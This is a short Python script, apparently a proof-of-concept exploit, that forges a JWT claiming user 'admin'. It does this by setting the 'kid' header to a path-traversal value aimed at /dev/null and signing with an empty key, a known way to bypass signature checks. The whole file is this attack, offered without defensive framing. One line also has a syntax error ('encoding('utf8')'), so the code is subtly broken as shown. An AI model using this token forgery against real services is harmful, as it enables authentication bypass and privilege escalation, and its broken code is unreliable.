import hmac
import base64
import hashlib
import json

header={"typ":"JWT","alg":"HS256","kid":"../../../../../../../dev/null"}
payload={"user":"admin"}
key=""
str=base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding('utf8')).decode('utf8').rstrip("=")

sig =base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf-8'),str.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
print(str+"."+sig)
